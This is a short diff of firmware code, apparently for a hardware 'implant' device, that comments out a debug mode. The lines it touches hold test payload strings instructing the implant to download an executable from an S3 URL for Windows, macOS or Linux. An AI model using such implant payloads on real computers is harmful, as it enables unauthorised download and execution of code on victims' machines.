@@ -12,8 +12,8 @@
 // We need to comment the next line, #define DEBUG false won't work as expected
 #define DEBUG true
 // Used by Oca to debug the code with an arduino without a SIM module and without an USB host
-#define DEBUGWITHOUTSIM true
-#define DEBUGWITHOUTSIM_PAYLOAD "unlock_download##win##XXXXXXXX##https://s3.amazonaws.com/hellotesthellotesthello/hello.exe"
+//#define DEBUGWITHOUTSIM true
+//#define DEBUGWITHOUTSIM_PAYLOAD "unlock_download##win##XXXXXXXX##https://s3.amazonaws.com/hellotesthellotesthello/hello.exe"
 //#define DEBUGWITHOUTSIM_PAYLOAD "unlock_download##osx##XXXXXXXX##https://s3.amazonaws.com/hellotesthellotesthello/hello_osx"
 //#define DEBUGWITHOUTSIM_PAYLOAD "unlock_download##lnx##XXXXXXXXX##https://s3.amazonaws.com/hellotesthellotesthello/hello_lin"
 #define IMPLANT_NAME "Implant 1"
